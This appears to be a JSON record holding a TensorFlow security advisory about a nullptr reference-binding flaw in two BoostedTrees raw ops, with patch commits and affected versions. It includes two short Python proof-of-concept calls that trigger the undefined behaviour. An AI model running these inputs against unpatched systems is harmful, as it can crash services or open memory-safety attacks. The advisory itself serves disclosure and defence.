{"description": "### Impact\nAn attacker can generate undefined behavior via a reference binding to nullptr in `BoostedTreesCalculateBestGainsPerFeature`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.BoostedTreesCalculateBestGainsPerFeature(\n  node_id_range=[],\n  stats_summary_list=[[1,2,3]],\n  l1=[1.0],\n  l2=[1.0],\n  tree_complexity =[1.0],\n  min_node_weight =[1.17],\n  max_splits=5)\n```\n\nA similar attack can occur in `BoostedTreesCalculateBestFeatureSplitV2`:\n\n```python\nimport tensorflow as tf\n                                                                                                                                                                                                                                                                                          \ntf.raw_ops.BoostedTreesCalculateBestFeatureSplitV2(\n  node_id_range=[],\n  stats_summaries_list=[[1,2,3]],\n  split_types=[''],\n  candidate_feature_ids=[1,2,3,4],\n  l1=[1],     \n  l2=[1],\n  tree_complexity=[1.0],\n  min_node_weight=[1.17],\n  logits_dimension=5)\n```     \n    \nThe  [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/boosted_trees/stats_ops.cc) does not validate the input values.\n\n### Patches\nWe have patched the issue in GitHub commit [9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad](https://github.com/tensorflow/tensorflow/commit/9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad) and in commit. [429f009d2b2c09028647dd4bb7b3f6f414bbaad7](https://github.com/tensorflow/tensorflow/commit/429f009d2b2c09028647dd4bb7b3f6f414bbaad7).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.", "methods": ["Reference binding to nullptr in `BoostedTreesCalculateBestGainsPerFeature` and `BoostedTreesCalculateBestFeatureSplitV2` functions.", "Unvalidated input values in `BoostedTreesCalculateBestGainsPerFeature` and `BoostedTreesCalculateBestFeatureSplitV2` functions."]}
